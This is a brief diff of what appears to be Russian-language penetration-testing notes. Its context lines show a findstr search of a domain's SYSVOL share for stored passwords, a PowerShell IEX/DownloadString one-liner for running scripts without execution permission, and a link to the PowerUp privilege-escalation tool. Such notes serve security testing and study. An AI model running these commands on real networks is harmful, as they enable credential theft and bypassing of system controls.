@@ -181,6 +181,8 @@ findstr /s /p /i /n /m "password" \\ta-d.local\SYSVOL\*.xml *.ini *.txt *.config
 Загрузка скриптов без получения разрешения на запуск POwerShell
 IEX (New-Object Net.WebClient).DownloadString("file://$PWD/pw.ps1")
 
+Import-Module - соответственно импорт модуля
+
 https://github.com/HarmJ0y/PowerUp
 
 !!! http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar
